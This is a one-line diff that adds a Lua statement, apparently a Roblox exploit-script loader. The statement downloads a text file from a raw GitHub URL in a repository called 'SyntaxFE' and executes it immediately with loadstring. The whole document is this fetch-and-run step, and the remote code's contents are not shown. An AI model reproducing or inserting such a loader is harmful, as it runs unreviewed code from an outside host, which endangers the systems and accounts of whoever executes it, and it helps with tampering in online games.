@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Vallater/SyntaxFE/fbbffe71caabfa5341bb0e09865c0659574978e8/GG.txt'),true))()
